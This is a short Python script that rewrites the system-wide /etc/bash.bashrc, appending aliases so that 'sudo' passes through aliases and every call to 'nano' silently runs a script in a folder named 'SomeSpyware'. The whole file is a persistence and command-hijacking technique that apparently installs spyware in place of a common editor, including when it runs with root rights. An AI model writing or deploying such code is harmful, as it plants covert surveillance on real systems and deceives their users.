file_data = ""
with open('/etc/bash.bashrc', 'r') as file:
    file_data = file.read()


with open('/etc/bash.bashrc', 'w') as file:
    file.write(file_data + "alias sudo='sudo '; alias nano='bash ~/SomeSpyware/nnano.sh'")
